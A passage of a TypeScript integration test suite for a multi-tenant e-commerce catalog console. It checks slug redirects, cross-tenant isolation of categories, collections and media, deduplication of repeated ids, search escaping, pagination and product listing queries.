    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const abandoned = `${prefix}-abandoned`;

    const owner = await createProduct({
      title: abandoned,
      status: "active",
      variants: [{ sku: `${prefix}-OWN`, price: "10", weightGrams: 1 }],
    });
    const ownerId = owner.data.productId as string;

    await updateProduct(ownerId, {
      title: `${prefix}-moved`,
      slug: `${prefix}-moved`,
      status: "active",
      variants: [{ sku: `${prefix}-OWN`, price: "10", weightGrams: 1 }],
    });

    // A second product now asks for the URL the first one abandoned.
    const squatter = await createProduct({
      title: abandoned,
      status: "active",
      variants: [{ sku: `${prefix}-SQU`, price: "10", weightGrams: 1 }],
    });

    // It does not get it. A superseded slug is still OWNED — it is the
    // redirect keeping the first product's inbound links alive, and
    // reassigning it would silently point them at a different product.
    expect(squatter.data.slug).toBe(`${abandoned}-2`);

    await expect(resolveStorefrontSlug(tenantA, abandoned)).resolves.toEqual({
      action: "redirect",
      to: `${prefix}-moved`,
      permanent: true,
    });
  });
});

describe("tenant isolation on every id a payload can name", () => {
  it("refuses another tenant's category, collection and variant image", async () => {
    // Built under tenant B by its own owner, so they genuinely exist.
    const theirs = await makeSession(tenantB, "owner");
    sessionToken = theirs.token;

    const categoryResponse = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: `Theirs ${randomUUID().slice(0, 6)}`,
      }),
    );
    const foreignCategory = (await categoryResponse.json()) as { id: string };

    const collectionResponse = await createCollectionRoute(
      jsonRequest("http://console.test/api/collections", {
        title: `Theirs ${randomUUID().slice(0, 6)}`,
      }),
    );
    const foreignCollection = (await collectionResponse.json()) as { id: string };

    // Tenant A cannot reach any of them. Each is its own request, so a
    // guard covering only the first field would still be caught.
    sessionToken = ownerToken;

    const cases: [string, Record<string, unknown>][] = [
      ["categoryIds", { categoryIds: [foreignCategory.id] }],
      ["collectionIds", { collectionIds: [foreignCollection.id] }],
      [
        "variants[].imageMediaId",
        {
          variants: [
            {
              sku: `X-${randomUUID().slice(0, 8)}`,
              price: "10",
              weightGrams: 1,
              imageMediaId: foreignMediaId,
            },
          ],
        },
      ],
    ];

    for (const [field, payload] of cases) {
      const { status, data } = await createProduct(productPayload({ title: "Reach", ...payload }));
      expect(status, field).toBe(422);
      expect(data, field).toMatchObject({ error: { code: "catalog_invalid" } });
    }

    // Nothing partial was left behind by any of the three.
    const [row] = await admin<{ count: string }[]>`
      SELECT count(*)::int AS count FROM products
      WHERE tenant_id = ${tenantA} AND title = 'Reach'`;
    expect(Number(row!.count)).toBe(0);
  });

  it("refuses another tenant's category as a parent", async () => {
    const theirs = await makeSession(tenantB, "owner");
    sessionToken = theirs.token;

    const response = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: `Foreign parent ${randomUUID().slice(0, 6)}`,
      }),
    );
    const foreign = (await response.json()) as { id: string };

    sessionToken = ownerToken;
    const attempt = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: "Child of a stranger",
        parentId: foreign.id,
      }),
    );

    expect(attempt.status).toBe(422);
    const body = (await attempt.json()) as {
      error: { details: { issues: { path: string }[] } };
    };
    expect(body.error.details.issues[0]!.path).toBe("parentId");
  });

  it("404s another tenant's category and collection instead of editing them", async () => {
    const theirs = await makeSession(tenantB, "owner");
    sessionToken = theirs.token;

    const categoryResponse = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", { title: "Their Category" }),
    );
    const foreignCategory = (await categoryResponse.json()) as { id: string };

    const collectionResponse = await createCollectionRoute(
      jsonRequest("http://console.test/api/collections", { title: "Their Collection" }),
    );
    const foreignCollection = (await collectionResponse.json()) as { id: string };

    sessionToken = ownerToken;

    const categoryAttempt = await updateCategoryRoute(
      jsonRequest(
        `http://console.test/api/categories/${foreignCategory.id}`,
        { title: "Hijacked" },
        "PUT",
      ),
      { params: Promise.resolve({ id: foreignCategory.id }) },
    );
    expect(categoryAttempt.status).toBe(404);

    const collectionAttempt = await updateCollectionRoute(
      jsonRequest(
        `http://console.test/api/collections/${foreignCollection.id}`,
        { title: "Hijacked" },
        "PUT",
      ),
      { params: Promise.resolve({ id: foreignCollection.id }) },
    );
    expect(collectionAttempt.status).toBe(404);

    const [category] = await admin<{ title: string }[]>`
      SELECT title FROM categories WHERE id = ${foreignCategory.id}`;
    const [collection] = await admin<{ title: string }[]>`
      SELECT title FROM collections WHERE id = ${foreignCollection.id}`;
    expect(category!.title).toBe("Their Category");
    expect(collection!.title).toBe("Their Collection");
  });

  it("deduplicates a repeated id instead of hitting the composite key", async () => {
    sessionToken = ownerToken;

    const categoryResponse = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: `Dedupe ${randomUUID().slice(0, 6)}`,
      }),
    );
    const category = (await categoryResponse.json()) as { id: string };
    const mediaId = await makeMedia(tenantA);

    // `product_categories` and `product_media` are keyed on
    // (tenant, product, other), so the same id twice used to be a
    // duplicate-key violation surfacing as an opaque 500. Not reachable
    // from the form — but Task 5's importer calls the same write layer.
    const { status, data } = await createProduct(
      productPayload({
        title: "Repeated Ids",
        categoryIds: [category.id, category.id],
        media: [
          { mediaId, alt: "first wins" },
          { mediaId, alt: "second ignored" },
        ],
      }),
    );

    expect(status).toBe(201);
    const productId = data.productId as string;

    const [counts] = await admin<{ categories: string; images: string }[]>`
      SELECT
        (SELECT count(*)::int FROM product_categories WHERE product_id = ${productId}) AS categories,
        (SELECT count(*)::int FROM product_media WHERE product_id = ${productId}) AS images`;
    expect(Number(counts!.categories)).toBe(1);
    expect(Number(counts!.images)).toBe(1);

    // The FIRST occurrence wins — it is the one whose position the
    // merchant chose, and position 0 is the LCP image.
    const [image] = await admin<{ alt: string }[]>`SELECT alt FROM media WHERE id = ${mediaId}`;
    expect(image!.alt).toBe("first wins");
  });

  it("lets an explicit id win over an earlier row's implicit SKU match", async () => {
    sessionToken = ownerToken;

    const prefix = randomUUID().slice(0, 6);
    const created = await createProduct({
      title: `Claim ${prefix}`,
      status: "draft",
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: `${prefix}-A`, options: { Size: "S" }, price: "10", weightGrams: 1 },
        { sku: `${prefix}-B`, options: { Size: "M" }, price: "20", weightGrams: 2 },
      ],
    });
    const productId = created.data.productId as string;

    const live = await admin<{ id: string; sku: string }[]>`
      SELECT id, sku FROM product_variants
      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;
    const v2 = live.find((r) => r.sku === `${prefix}-B`)!;

    // Index 0 carries NO id and the SKU "B", which matches V2. Index 1
    // names V2 EXPLICITLY. Resolving in payload order would let index 0
    // claim V2 by SKU and leave index 1 to insert a fresh row — the
    // opposite of what the payload asks for.
    const saved = await updateProduct(productId, {
      title: `Claim ${prefix}`,
      status: "draft",
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: `${prefix}-B`, options: { Size: "S" }, price: "10", weightGrams: 1 },
        { id: v2.id, sku: `${prefix}-C`, options: { Size: "M" }, price: "20", weightGrams: 2 },
      ],
    });
    expect(saved.status).toBe(200);

    const after = await admin<{ id: string; sku: string }[]>`
      SELECT id, sku FROM product_variants
      WHERE product_id = ${productId} AND deleted_at IS NULL ORDER BY position`;

    // V2 is the row a Phase 2 order line points at, and it must be the
    // one the explicit id named — the "C" variant, not the "B" one.
    expect(after.find((r) => r.id === v2.id)!.sku).toBe(`${prefix}-C`);
    expect(after.find((r) => r.sku === `${prefix}-B`)!.id).not.toBe(v2.id);
  });
});

describe("console catalog queries", () => {
  /** Its own tenant, so pagination counts cannot drift with other tests. */
  let queryTenant: string;
  let queryToken: string;
  const titles = ["Alpha Widget", "Beta Widget", "Gamma Gadget"];
  const productIds: string[] = [];
  let pendingMediaId: string;
  let readyMediaId: string;

  beforeAll(async () => {
    queryTenant = await makeTenant();
    queryToken = (await makeSession(queryTenant, "owner")).token;
    sessionToken = queryToken;

    readyMediaId = await makeMedia(queryTenant);
    const [pending] = await admin<{ id: string }[]>`
      INSERT INTO media (id, tenant_id, storage_key, mime_type, byte_size, status)
      VALUES (${randomUUID()}, ${queryTenant},
              ${`${queryTenant}/${randomUUID()}.png`}, 'image/png', 100, 'pending')
      RETURNING id`;
    pendingMediaId = pending!.id;

    for (const [i, title] of titles.entries()) {
      const created = await createProduct({
        title,
        status: i === 2 ? "draft" : "active",
        axes: [{ name: "Size", values: ["S", "M"] }],
        // Deliberately large amounts: bigint aggregates arrive from the
        // driver as STRINGS, so these pin the Number() at the boundary.
        variants: [
          { sku: `Q-${i}-A`, options: { Size: "S" }, price: "12345678.90", weightGrams: 100 },
          { sku: `Q-${i}-B`, options: { Size: "M" }, price: "99999999.99", weightGrams: 100 },
        ],
        media:
          i === 0
            ? [
                { mediaId: readyMediaId, alt: "hero" },
                { mediaId: pendingMediaId, alt: "second" },
              ]
            : [],
      });
      expect(created.status).toBe(201);
      productIds.push(created.data.productId as string);
    }

    sessionToken = undefined;
  });

  it("returns every product with an exact total and price range", async () => {
    const { items, total } = await listProductsForConsole(queryTenant);

    expect(total).toBe(3);
    expect(items).toHaveLength(3);

    const alpha = items.find((i) => i.title === "Alpha Widget")!;
    // Exact integers, not strings. `min()`/`max()` over bigint come back
    // from the driver as strings; without the Number() at the boundary
    // these would be "1234567890" and "9999999999", and this fails.
    expect(alpha.minPricePaise).toBe(1234567890);
    expect(alpha.maxPricePaise).toBe(9999999999);
    expect(typeof alpha.minPricePaise).toBe("number");
    expect(alpha.variantCount).toBe(2);
    expect(alpha.currency).toBe("INR");
    expect(alpha.slug).toBe("alpha-widget");
  });

  it("shows drafts, which the storefront listing must never do", async () => {
    const { items } = await listProductsForConsole(queryTenant);
    expect(items.map((i) => i.status).sort()).toEqual(["active", "active", "draft"]);
  });

  it("filters by status", async () => {
    const active = await listProductsForConsole(queryTenant, { status: "active" });
    expect(active.total).toBe(2);
    expect(active.items.every((i) => i.status === "active")).toBe(true);

    const draft = await listProductsForConsole(queryTenant, { status: "draft" });
    expect(draft.total).toBe(1);
    expect(draft.items[0]!.title).toBe("Gamma Gadget");

    const archived = await listProductsForConsole(queryTenant, { status: "archived" });
    expect(archived.total).toBe(0);
    expect(archived.items).toEqual([]);
  });

  it("searches by title and by SKU", async () => {
    // Title. Two of the three are "… Widget".
    const byTitle = await listProductsForConsole(queryTenant, { search: "widget" });
    expect(byTitle.total).toBe(2);

    // SKU, through the hand-written EXISTS subquery — a merchant who
    // types a SKU into a product search and gets nothing concludes the
    // product is missing.
    const bySku = await listProductsForConsole(queryTenant, { search: "Q-2-A" });
    expect(bySku.total).toBe(1);
    expect(bySku.items[0]!.title).toBe("Gamma Gadget");

    const noMatch = await listProductsForConsole(queryTenant, { search: "nothing-matches-this" });
    expect(noMatch.total).toBe(0);
    expect(noMatch.items).toEqual([]);
  });

  it("treats LIKE metacharacters in a search as literals", async () => {
    // An unescaped `%` would match every product rather than none, which
    // reads as "search is broken" the first time a merchant types one.
    const wildcard = await listProductsForConsole(queryTenant, { search: "%" });
    expect(wildcard.total).toBe(0);

    const underscore = await listProductsForConsole(queryTenant, { search: "_lpha" });
    expect(underscore.total).toBe(0);
  });

  it("pages with a stable total and no overlap", async () => {
    const first = await listProductsForConsole(queryTenant, { limit: 2, offset: 0 });
    const second = await listProductsForConsole(queryTenant, { limit: 2, offset: 2 });

    // The total is of the whole filtered set, not of the page.
    expect(first.total).toBe(3);
    expect(second.total).toBe(3);
    expect(first.items).toHaveLength(2);
    expect(second.items).toHaveLength(1);

    // Ordering is deterministic — updatedAt then id — so the pages
    // partition the set rather than repeating a row across the boundary.
    const seen = [...first.items, ...second.items].map((i) => i.id);
    expect(new Set(seen).size).toBe(3);

    const past = await listProductsForConsole(queryTenant, { limit: 2, offset: 99 });
    expect(past.total).toBe(3);
    expect(past.items).toEqual([]);
  });

  it("clamps a hostile limit rather than trusting it", async () => {
    expect((await listProductsForConsole(queryTenant, { limit: 10_000 })).items.length).toBe(3);
    expect((await listProductsForConsole(queryTenant, { limit: 0 })).items.length).toBe(1);
    expect((await listProductsForConsole(queryTenant, { offset: -5 })).items.length).toBe(3);
    // Pinned, not read from the constant under test.
    expect(CONSOLE_PAGE_SIZE).toBe(25);
  });

  it("reports the hero image at position 0 with its real status", async () => {
    const all = await listProductsForConsole(queryTenant);
    const alpha = all.items.find((i) => i.title === "Alpha Widget")!;

    // Position 0, and NOT filtered to `ready` the way the storefront
    // filters: a merchant must be able to see that their own image is
    // still processing rather than have it silently missing.
    expect(alpha.image).not.toBeNull();
    expect(alpha.image!.status).toBe("ready");
    expect(alpha.image!.alt).toBe("hero");

    expect(all.items.find((i) => i.title === "Gamma Gadget")!.image).toBeNull();
  });

  it("loads a product for the edit form, pending media included", async () => {
    const product = await getProductForConsole(queryTenant, productIds[0]!);

    expect(product).not.toBeNull();
    expect(product!.title).toBe("Alpha Widget");
    expect(product!.slug).toBe("alpha-widget");
    expect(product!.historicalSlugs).toEqual([]);
    expect(product!.variants).toHaveLength(2);
    expect(product!.variants[0]!.pricePaise).toBe(1234567890);
    // Both images, including the one the worker has not finished.
    expect(product!.media.map((m) => m.status).sort()).toEqual(["pending", "ready"]);
  });

  it("returns null for a product belonging to another tenant", async () => {
    // The console read path carries an explicit tenant predicate on top
    // of RLS; this pins that a foreign id is a miss, not a leak.
    await expect(getProductForConsole(tenantA, productIds[0]!)).resolves.toBeNull();
    await expect(getProductForConsole(queryTenant, randomUUID())).resolves.toBeNull();
  });

  it("carries historical slugs onto the edit form after a rename", async () => {
    sessionToken = queryToken;
    await updateProduct(productIds[1]!, {
      title: "Beta Widget",
      slug: "beta-widget-renamed",
      status: "active",
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: "Q-1-A", options: { Size: "S" }, price: "12345678.90", weightGrams: 100 },
        { sku: "Q-1-B", options: { Size: "M" }, price: "99999999.99", weightGrams: 100 },
      ],
    });
    sessionToken = undefined;

    const product = await getProductForConsole(queryTenant, productIds[1]!);
    expect(product!.slug).toBe("beta-widget-renamed");
    expect(product!.historicalSlugs).toEqual(["beta-widget"]);
  });

  it("lists hidden taxonomy with product counts, unlike the storefront", async () => {
    sessionToken = queryToken;

    const visible = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", { title: "Visible Cat" }),
    );
    const hidden = await createCategoryRoute(
      jsonRequest("http://console.test/api/categories", {
        title: "Hidden Cat",
        isVisible: false,
      }),
    );
    const visibleId = ((await visible.json()) as { id: string }).id;
    const hiddenId = ((await hidden.json()) as { id: string }).id;

    await updateProduct(productIds[2]!, {
      title: "Gamma Gadget",
      slug: "gamma-gadget",
      status: "draft",
      categoryIds: [visibleId],
      axes: [{ name: "Size", values: ["S", "M"] }],
      variants: [
        { sku: "Q-2-A", options: { Size: "S" }, price: "12345678.90", weightGrams: 100 },
        { sku: "Q-2-B", options: { Size: "M" }, price: "99999999.99", weightGrams: 100 },
      ],
    });
    sessionToken = undefined;

    const taxonomy = await listTaxonomyForConsole(queryTenant);

    // `listCategories` filters `is_visible`, which is right for a
    // storefront and wrong here — a merchant who hides a category must
    // still be able to find it again to unhide it.
    const found = taxonomy.categories.find((c) => c.id === hiddenId);
    expect(found).toBeDefined();
    expect(found!.isVisible).toBe(false);
    expect(found!.slug).toBe("hidden-cat");

    expect(taxonomy.categories.find((c) => c.id === visibleId)!.productCount).toBe(1);
    expect(found!.productCount).toBe(0);
  });

  it("lists the tenant's media, newest first, without another tenant's", async () => {
    const library = await listMediaForConsole(queryTenant);

    expect(library.map((m) => m.id)).toContain(readyMediaId);
    expect(library.map((m) => m.id)).toContain(pendingMediaId);
    expect(library.map((m) => m.id)).not.toContain(foreignMediaId);
    expect(library.find((m) => m.id === pendingMediaId)!.status).toBe("pending");
  });
});
